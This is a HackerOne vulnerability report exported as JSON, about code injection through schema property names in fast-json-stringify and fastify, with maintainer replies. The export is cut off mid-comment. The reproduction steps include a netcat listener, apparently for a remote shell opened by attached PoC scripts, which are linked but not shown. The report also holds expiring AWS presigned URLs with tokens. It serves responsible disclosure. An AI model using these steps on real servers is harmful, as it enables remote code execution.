{"id":532667,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MzI2Njc=","url":"https://hackerone.com/reports/532667","title":"Server Side JavaScript Code Injection","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-04-09T15:23:13.508Z","submitted_at":"2019-04-09T15:23:13.508Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"phra","url":"/phra","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/201/213/71f68147b3cb0e1d6e7e39953fc2c4822d04d338_original.jpeg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-10-03T18:17:41.756Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-09-03T18:17:32.418Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I would like to report a Service Side JavaScript Code Injection in `fastify`.\nIt allows an attacker that can control a single property name in the serialization schema to achieve Remote Command Execution in the context of the web server.\n\n# Module\n\n**module name:** fastify\n**version:** 2.2.0\n**npm page:** `https://www.npmjs.com/package/fastify`\n\n## Module Description\n\n\u003e An efficient server implies a lower cost of the infrastructure, a better responsiveness under load and happy users. How can you efficiently handle the resources of your server, knowing that you are serving the highest number of requests as possible, without sacrificing security validations and handy development? Enter Fastify. Fastify is a web framework highly focused on providing the best developer experience with the least overhead and a powerful plugin architecture. It is inspired by Hapi and Express and as far as we know, it is one of the fastest web frameworks in town.\n\n## Module Stats\n\n39,119 downloads in the last week\n\n# Vulnerability\n\n## Vulnerability Description\n\n\u003e Description about how the vulnerability was found and how it can be exploited, how it harms package users (data modification/lost, system access, other.\n\n## Steps To Reproduce:\n\n\u003e Detailed steps to reproduce with all required references/steps/commands. If there is any exploit code or reference to the package source code this is the place where it should be put.\n\n## Patch\n\nEscape `\"`, `'` and ``` ` ``` in properties names in schema definition.\n\n## Supporting Material/References:\n\n\u003e State all technical information about the stack where the vulnerability was found\n\n- **OS:** Kali Rolling\n- **NodeJS:** 11.9\n- **NPM:** 6.5.0\n- **fast-json-stringify:** 1.14.0\n\n# Wrap up\n\n\u003e Select Y or N for the following statements:\n\n- I contacted the maintainer to let them know: Y (sent message to Matteo Collina)\n- I opened an issue in the related repository: N\n\n## Impact\n\nIf an attacker can control somehow the schema definition, he/she can achieve arbitrary code execution as the user running the web server.","vulnerability_information_html":"\u003cp\u003eI would like to report a Service Side JavaScript Code Injection in \u003ccode\u003efastify\u003c/code\u003e.\u003cbr\u003e\nIt allows an attacker that can control a single property name in the serialization schema to achieve Remote Command Execution in the context of the web server.\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e fastify\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 2.2.0\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/fastify\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eAn efficient server implies a lower cost of the infrastructure, a better responsiveness under load and happy users. How can you efficiently handle the resources of your server, knowing that you are serving the highest number of requests as possible, without sacrificing security validations and handy development? Enter Fastify. Fastify is a web framework highly focused on providing the best developer experience with the least overhead and a powerful plugin architecture. It is inspired by Hapi and Express and as far as we know, it is one of the fastest web frameworks in town.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cp\u003e39,119 downloads in the last week\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eDescription about how the vulnerability was found and how it can be exploited, how it harms package users (data modification/lost, system access, other.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eDetailed steps to reproduce with all required references/steps/commands. If there is any exploit code or reference to the package source code this is the place where it should be put.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch2 id=\"patch\"\u003ePatch\u003c/h2\u003e\n\n\u003cp\u003eEscape \u003ccode\u003e\u0026quot;\u003c/code\u003e, \u003ccode\u003e\u0026#39;\u003c/code\u003e and \u003ccode\u003e`\u003c/code\u003e in properties names in schema definition.\u003c/p\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eState all technical information about the stack where the vulnerability was found\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cul\u003e\n\u003cli\u003e\n\u003cstrong\u003eOS:\u003c/strong\u003e Kali Rolling\u003c/li\u003e\n\u003cli\u003e\n\u003cstrong\u003eNodeJS:\u003c/strong\u003e 11.9\u003c/li\u003e\n\u003cli\u003e\n\u003cstrong\u003eNPM:\u003c/strong\u003e 6.5.0\u003c/li\u003e\n\u003cli\u003e\n\u003cstrong\u003efast-json-stringify:\u003c/strong\u003e 1.14.0\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eSelect Y or N for the following statements:\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: Y (sent message to Matteo Collina)\u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: N\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eIf an attacker can control somehow the schema definition, he/she can achieve arbitrary code execution as the user running the web server.\u003c/p\u003e\n","bounty_amount":"250.0","formatted_bounty":"$250","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":465338,"file_name":"poc-fast-json-stringify.js","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/465/338/26bb244a589abb4bcfefb84b7fa411b7c0660f76/poc-fast-json-stringify.js?response-content-disposition=attachment%3B%20filename%3D%22poc-fast-json-stringify.js%22%3B%20filename%2A%3DUTF-8%27%27poc-fast-json-stringify.js\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3MMGRP5H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061538Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICEZ9R%2B2RJ3GrTP6l%2FPAFADJG1t55InVtXNQpLfOPgHaAiEA9vebVe9XdCpFDuGnxxWe2Ve48e%2FtAoig8YYxqZ7es78qtAMIUhABGgwwMTM2MTkyNzQ4NDkiDH6RMqd3Km1HzDzcXiqRAw9Zi9Zyah%2FL7m5qi9w2XsNDr%2F5ZZ%2F5Gny1bCMAgWHuEH9Lmtzfddi67Q3u82zHSnheCFLE%2BUTr6KCbyVouh2s6I1Iw5FpZ4LCl2Jts%2FOYIW3f51kFQhZ3sOfoeJ95jG2hfROCEhzpnA30iPS6xMNw87KO9Qo4x%2FBM37CIhv4A0%2FSU0JbwvczB01wva%2FQJkiH6lH1ZVS3EG6yUh%2Feq8kDGf%2FnGRgLcxw3MK7jT4GG1knwEEDIQOAuumsmWt3QDUH6dFWYx57C2QS76Xr1I1ub7Ob050enItoD3hnXR1F2lhC9JZWyDDS3sRTHvPx0voGVfuM803u8XTKLOZxTNSBY1S8m7RRU55us25%2BTyEe9Q6J6l3ZXKJZ8Jv02FW7RtNRHdPm0L6O0I3vOQbn8GiBG%2FkhDZRW3AOAiJuB4Bhd6Ns7j3YXA9nKlctO1uYmAj%2B6nssjBtl1lKabSm0eGuk7Feh%2B9jG%2BgpNFzxS0iYgysVfwkvplnvmKgReLAD4JvjZ9sdbv66UX5MyW9gDVXf0wfna3MN2Fqv8FOusBFyKfufPYQYGFwO4tvl1lihdDkLnCZcRwmXrB0gYZzbAneLC1UJ9NimBCebx3LEek%2BJ0J1MdqCNRGrLEY92gh38wj7A61ZNLFh9KTVAiyEFWLju0gH5kr3ndnXguXCxD19p54ZTSuYzlTQ9ArEyfvPBo%2F%2BWy25KkCTRlm376pduEzwhG4%2FgpY13ZbeNcDXcGVf2lvpy33oGJqXFcfCgWJYbDCm0M%2FBGBrkOhnizXl7hE2kfO2aQgP2N8b5LucE1O2Tl%2B%2B7ABCWc7Sl7RPhipBfTbyd%2FEfgt9ObkPFxAc0xnS36iwoGt1oKkhotg%3D%3D\u0026X-Amz-Signature=586400df12f08dd8b81a7f11859b29be32f7cc1ba9fee8a7c6dd6c9bf3c5cb0a","file_size":2861,"type":"text/plain"},{"id":465339,"file_name":"poc-fastify.js","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/465/339/93f50fa838e2f110e76965f37c5b485ab16aba63/poc-fastify.js?response-content-disposition=attachment%3B%20filename%3D%22poc-fastify.js%22%3B%20filename%2A%3DUTF-8%27%27poc-fastify.js\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3MMGRP5H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061538Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICEZ9R%2B2RJ3GrTP6l%2FPAFADJG1t55InVtXNQpLfOPgHaAiEA9vebVe9XdCpFDuGnxxWe2Ve48e%2FtAoig8YYxqZ7es78qtAMIUhABGgwwMTM2MTkyNzQ4NDkiDH6RMqd3Km1HzDzcXiqRAw9Zi9Zyah%2FL7m5qi9w2XsNDr%2F5ZZ%2F5Gny1bCMAgWHuEH9Lmtzfddi67Q3u82zHSnheCFLE%2BUTr6KCbyVouh2s6I1Iw5FpZ4LCl2Jts%2FOYIW3f51kFQhZ3sOfoeJ95jG2hfROCEhzpnA30iPS6xMNw87KO9Qo4x%2FBM37CIhv4A0%2FSU0JbwvczB01wva%2FQJkiH6lH1ZVS3EG6yUh%2Feq8kDGf%2FnGRgLcxw3MK7jT4GG1knwEEDIQOAuumsmWt3QDUH6dFWYx57C2QS76Xr1I1ub7Ob050enItoD3hnXR1F2lhC9JZWyDDS3sRTHvPx0voGVfuM803u8XTKLOZxTNSBY1S8m7RRU55us25%2BTyEe9Q6J6l3ZXKJZ8Jv02FW7RtNRHdPm0L6O0I3vOQbn8GiBG%2FkhDZRW3AOAiJuB4Bhd6Ns7j3YXA9nKlctO1uYmAj%2B6nssjBtl1lKabSm0eGuk7Feh%2B9jG%2BgpNFzxS0iYgysVfwkvplnvmKgReLAD4JvjZ9sdbv66UX5MyW9gDVXf0wfna3MN2Fqv8FOusBFyKfufPYQYGFwO4tvl1lihdDkLnCZcRwmXrB0gYZzbAneLC1UJ9NimBCebx3LEek%2BJ0J1MdqCNRGrLEY92gh38wj7A61ZNLFh9KTVAiyEFWLju0gH5kr3ndnXguXCxD19p54ZTSuYzlTQ9ArEyfvPBo%2F%2BWy25KkCTRlm376pduEzwhG4%2FgpY13ZbeNcDXcGVf2lvpy33oGJqXFcfCgWJYbDCm0M%2FBGBrkOhnizXl7hE2kfO2aQgP2N8b5LucE1O2Tl%2B%2B7ABCWc7Sl7RPhipBfTbyd%2FEfgt9ObkPFxAc0xnS36iwoGt1oKkhotg%3D%3D\u0026X-Amz-Signature=eb74d77fb888f70c6a1bd0a6f466e11a48219ed50291a0601b3f0b72f794b888","file_size":2008,"type":"text/plain"},{"id":465341,"file_name":"proof.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/465/341/04882000450ebc5083fc5289a7c7b0a62a87a26c/proof.png?response-content-disposition=attachment%3B%20filename%3D%22proof.png%22%3B%20filename%2A%3DUTF-8%27%27proof.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3MMGRP5H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061538Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICEZ9R%2B2RJ3GrTP6l%2FPAFADJG1t55InVtXNQpLfOPgHaAiEA9vebVe9XdCpFDuGnxxWe2Ve48e%2FtAoig8YYxqZ7es78qtAMIUhABGgwwMTM2MTkyNzQ4NDkiDH6RMqd3Km1HzDzcXiqRAw9Zi9Zyah%2FL7m5qi9w2XsNDr%2F5ZZ%2F5Gny1bCMAgWHuEH9Lmtzfddi67Q3u82zHSnheCFLE%2BUTr6KCbyVouh2s6I1Iw5FpZ4LCl2Jts%2FOYIW3f51kFQhZ3sOfoeJ95jG2hfROCEhzpnA30iPS6xMNw87KO9Qo4x%2FBM37CIhv4A0%2FSU0JbwvczB01wva%2FQJkiH6lH1ZVS3EG6yUh%2Feq8kDGf%2FnGRgLcxw3MK7jT4GG1knwEEDIQOAuumsmWt3QDUH6dFWYx57C2QS76Xr1I1ub7Ob050enItoD3hnXR1F2lhC9JZWyDDS3sRTHvPx0voGVfuM803u8XTKLOZxTNSBY1S8m7RRU55us25%2BTyEe9Q6J6l3ZXKJZ8Jv02FW7RtNRHdPm0L6O0I3vOQbn8GiBG%2FkhDZRW3AOAiJuB4Bhd6Ns7j3YXA9nKlctO1uYmAj%2B6nssjBtl1lKabSm0eGuk7Feh%2B9jG%2BgpNFzxS0iYgysVfwkvplnvmKgReLAD4JvjZ9sdbv66UX5MyW9gDVXf0wfna3MN2Fqv8FOusBFyKfufPYQYGFwO4tvl1lihdDkLnCZcRwmXrB0gYZzbAneLC1UJ9NimBCebx3LEek%2BJ0J1MdqCNRGrLEY92gh38wj7A61ZNLFh9KTVAiyEFWLju0gH5kr3ndnXguXCxD19p54ZTSuYzlTQ9ArEyfvPBo%2F%2BWy25KkCTRlm376pduEzwhG4%2FgpY13ZbeNcDXcGVf2lvpy33oGJqXFcfCgWJYbDCm0M%2FBGBrkOhnizXl7hE2kfO2aQgP2N8b5LucE1O2Tl%2B%2B7ABCWc7Sl7RPhipBfTbyd%2FEfgt9ObkPFxAc0xnS36iwoGt1oKkhotg%3D%3D\u0026X-Amz-Signature=542ed4922137b66fde63c3fabc027daa21377626199624f4e6bef9fc0a7073df","file_size":108983,"type":"image/png"}],"allow_singular_disclosure_at":"2019-10-03T18:17:32.893Z","allow_singular_disclosure_after":-39095885.419538215,"singular_disclosure_allowed":true,"vote_count":10,"voters":["yxw21","bl4de","mik317","eveeez","0x08","armansameer","d4vinci","fingerling","yoflow","herlock-momo"],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":4647,"asset_type":"SOURCE_CODE","asset_identifier":"fastify","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4519319,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\nThanks for reporting this to us. Someone will quickly look at this report and triage it.","markdown_message":"\u003cp\u003eHello,\u003cbr\u003e\nThanks for reporting this to us. Someone will quickly look at this report and triage it.\u003c/p\u003e\n","automated_response":true,"created_at":"2019-04-09T15:23:19.262Z","updated_at":"2019-04-09T15:23:19.262Z","actor":{"username":"vdeturckheim_dev","cleared":false,"url":"/vdeturckheim_dev","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4519343,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"# Vulnerability\n\n## Description\n`fastify` is using `fast-json-stingify` to serialize data in the response. This library is vulnerable to Server Side Code Injection, as shown in the attached poc. The only constrain for the attacker is to be able to control a field name in the schema definition.\n\n## Steps To Reproduce:\n- Run the attached `vuln-server.js`\n`nodepoc-fastify.js`\n\n- Prepare netcat on port 1337:\n`nc -lvvp 1337`\n\n- Send GET request to the server:\n`curl 127.0.0.1`","markdown_message":"\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\n\u003cp\u003e\u003ccode\u003efastify\u003c/code\u003e is using \u003ccode\u003efast-json-stingify\u003c/code\u003e to serialize data in the response. This library is vulnerable to Server Side Code Injection, as shown in the attached poc. The only constrain for the attacker is to be able to control a field name in the schema definition.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003eRun the attached \u003ccode\u003evuln-server.js\u003c/code\u003e\u003cbr\u003e\n\u003ccode\u003enodepoc-fastify.js\u003c/code\u003e\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003ePrepare netcat on port 1337:\u003cbr\u003e\n\u003ccode\u003enc -lvvp 1337\u003c/code\u003e\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eSend GET request to the server:\u003cbr\u003e\n\u003ccode\u003ecurl 127.0.0.1\u003c/code\u003e\u003c/p\u003e\u003c/li\u003e\n\u003c/ul\u003e\n","automated_response":false,"created_at":"2019-04-09T15:28:02.863Z","updated_at":"2019-04-09T15:35:59.004Z","actor":{"username":"phra","cleared":false,"url":"/phra","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/201/213/71f68147b3cb0e1d6e7e39953fc2c4822d04d338_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":465354,"filename":"vuln-server.js","type":"text/plain","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/465/354/4631fc96b5c769e9231e8e107abd36dbfff8fac4/vuln-server.js?response-content-disposition=attachment%3B%20filename%3D%22vuln-server.js%22%3B%20filename%2A%3DUTF-8%27%27vuln-server.js\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3MMGRP5H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061538Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICEZ9R%2B2RJ3GrTP6l%2FPAFADJG1t55InVtXNQpLfOPgHaAiEA9vebVe9XdCpFDuGnxxWe2Ve48e%2FtAoig8YYxqZ7es78qtAMIUhABGgwwMTM2MTkyNzQ4NDkiDH6RMqd3Km1HzDzcXiqRAw9Zi9Zyah%2FL7m5qi9w2XsNDr%2F5ZZ%2F5Gny1bCMAgWHuEH9Lmtzfddi67Q3u82zHSnheCFLE%2BUTr6KCbyVouh2s6I1Iw5FpZ4LCl2Jts%2FOYIW3f51kFQhZ3sOfoeJ95jG2hfROCEhzpnA30iPS6xMNw87KO9Qo4x%2FBM37CIhv4A0%2FSU0JbwvczB01wva%2FQJkiH6lH1ZVS3EG6yUh%2Feq8kDGf%2FnGRgLcxw3MK7jT4GG1knwEEDIQOAuumsmWt3QDUH6dFWYx57C2QS76Xr1I1ub7Ob050enItoD3hnXR1F2lhC9JZWyDDS3sRTHvPx0voGVfuM803u8XTKLOZxTNSBY1S8m7RRU55us25%2BTyEe9Q6J6l3ZXKJZ8Jv02FW7RtNRHdPm0L6O0I3vOQbn8GiBG%2FkhDZRW3AOAiJuB4Bhd6Ns7j3YXA9nKlctO1uYmAj%2B6nssjBtl1lKabSm0eGuk7Feh%2B9jG%2BgpNFzxS0iYgysVfwkvplnvmKgReLAD4JvjZ9sdbv66UX5MyW9gDVXf0wfna3MN2Fqv8FOusBFyKfufPYQYGFwO4tvl1lihdDkLnCZcRwmXrB0gYZzbAneLC1UJ9NimBCebx3LEek%2BJ0J1MdqCNRGrLEY92gh38wj7A61ZNLFh9KTVAiyEFWLju0gH5kr3ndnXguXCxD19p54ZTSuYzlTQ9ArEyfvPBo%2F%2BWy25KkCTRlm376pduEzwhG4%2FgpY13ZbeNcDXcGVf2lvpy33oGJqXFcfCgWJYbDCm0M%2FBGBrkOhnizXl7hE2kfO2aQgP2N8b5LucE1O2Tl%2B%2B7ABCWc7Sl7RPhipBfTbyd%2FEfgt9ObkPFxAc0xnS36iwoGt1oKkhotg%3D%3D\u0026X-Amz-Signature=fea592464f173c57e9577c6525797d45ffa9b76384da483d7ef007fea1fe52ec"}],"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4519440,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-09T15:36:07.023Z","updated_at":"2019-04-09T15:36:07.023Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4519459,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I added @mcollina to the report.","markdown_message":"\u003cp\u003eI added \u003ca href=\"/mcollina\"\u003e@mcollina\u003c/a\u003e to the report.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-09T15:38:58.582Z","updated_at":"2019-04-09T15:38:58.582Z","actor":{"username":"vdeturckheim","cleared":false,"url":"/vdeturckheim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/010/6f383ac0f9296c13b5ac0d38741f0685dbace58c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4531152,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I tried to patch the vulnerable library `fast-json-stringify` but I had hard time with it due to the fact that is a single file of ~1K lines and multiple points have to be updated without breaking the intended functionality.\nThe input is reflected 4 times in the generated script, as shown in the attached screenshot.\nIt would be nice if someone could help with fixing the library.","markdown_message":"\u003cp\u003eI tried to patch the vulnerable library \u003ccode\u003efast-json-stringify\u003c/code\u003e but I had hard time with it due to the fact that is a single file of ~1K lines and multiple points have to be updated without breaking the intended functionality.\u003cbr\u003e\nThe input is reflected 4 times in the generated script, as shown in the attached screenshot.\u003cbr\u003e\nIt would be nice if someone could help with fixing the library.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-10T15:31:47.308Z","updated_at":"2019-04-10T15:31:47.308Z","actor":{"username":"phra","cleared":false,"url":"/phra","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/201/213/71f68147b3cb0e1d6e7e39953fc2c4822d04d338_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":466158,"filename":"reflections.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/466/158/67802158cae0df141cebc163a1250f4caab3fb04/reflections.png?response-content-disposition=attachment%3B%20filename%3D%22reflections.png%22%3B%20filename%2A%3DUTF-8%27%27reflections.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3MMGRP5H%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061538Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICEZ9R%2B2RJ3GrTP6l%2FPAFADJG1t55InVtXNQpLfOPgHaAiEA9vebVe9XdCpFDuGnxxWe2Ve48e%2FtAoig8YYxqZ7es78qtAMIUhABGgwwMTM2MTkyNzQ4NDkiDH6RMqd3Km1HzDzcXiqRAw9Zi9Zyah%2FL7m5qi9w2XsNDr%2F5ZZ%2F5Gny1bCMAgWHuEH9Lmtzfddi67Q3u82zHSnheCFLE%2BUTr6KCbyVouh2s6I1Iw5FpZ4LCl2Jts%2FOYIW3f51kFQhZ3sOfoeJ95jG2hfROCEhzpnA30iPS6xMNw87KO9Qo4x%2FBM37CIhv4A0%2FSU0JbwvczB01wva%2FQJkiH6lH1ZVS3EG6yUh%2Feq8kDGf%2FnGRgLcxw3MK7jT4GG1knwEEDIQOAuumsmWt3QDUH6dFWYx57C2QS76Xr1I1ub7Ob050enItoD3hnXR1F2lhC9JZWyDDS3sRTHvPx0voGVfuM803u8XTKLOZxTNSBY1S8m7RRU55us25%2BTyEe9Q6J6l3ZXKJZ8Jv02FW7RtNRHdPm0L6O0I3vOQbn8GiBG%2FkhDZRW3AOAiJuB4Bhd6Ns7j3YXA9nKlctO1uYmAj%2B6nssjBtl1lKabSm0eGuk7Feh%2B9jG%2BgpNFzxS0iYgysVfwkvplnvmKgReLAD4JvjZ9sdbv66UX5MyW9gDVXf0wfna3MN2Fqv8FOusBFyKfufPYQYGFwO4tvl1lihdDkLnCZcRwmXrB0gYZzbAneLC1UJ9NimBCebx3LEek%2BJ0J1MdqCNRGrLEY92gh38wj7A61ZNLFh9KTVAiyEFWLju0gH5kr3ndnXguXCxD19p54ZTSuYzlTQ9ArEyfvPBo%2F%2BWy25KkCTRlm376pduEzwhG4%2FgpY13ZbeNcDXcGVf2lvpy33oGJqXFcfCgWJYbDCm0M%2FBGBrkOhnizXl7hE2kfO2aQgP2N8b5LucE1O2Tl%2B%2B7ABCWc7Sl7RPhipBfTbyd%2FEfgt9ObkPFxAc0xnS36iwoGt1oKkhotg%3D%3D\u0026X-Amz-Signature=e02b8c8e3c0dee0271445c58b0b71d79bcddcfbd562d4041dd759031a18a7e6c"}],"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4538690,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This is not a vulnerability, but just a \"bad\" bug. The scope of fast-json-stringify is to generate a new function that is extremely fast on rendering json. That's what the library is for. Feel free to recommend some more text to explain the functionality and relative danger if used with user-specified data.\n\nIn fastify, it is not possible to set the schema of a route dynamically without modifying the source code. As result, fastify is not vulnerable.\n\n---\n\nWe are happy to land a PR that address this bad bug, if we get one.\n\nAn alternative approach can be to detect this type of patterns instead of sanitizing, and throwing an error in those cases.","markdown_message":"\u003cp\u003eThis is not a vulnerability, but just a \u0026quot;bad\u0026quot; bug. The scope of fast-json-stringify is to generate a new function that is extremely fast on rendering json. That\u0026#39;s what the library is for. Feel free to recommend some more text to explain the functionality and relative danger if used with user-specified data.\u003c/p\u003e\n\n\u003cp\u003eIn fastify, it is not possible to set the schema of a route dynamically without modifying the source code. As result, fastify is not vulnerable.\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eWe are happy to land a PR that address this bad bug, if we get one.\u003c/p\u003e\n\n\u003cp\u003eAn alternative approach can be to detect this type of patterns instead of sanitizing, and throwing an error in those 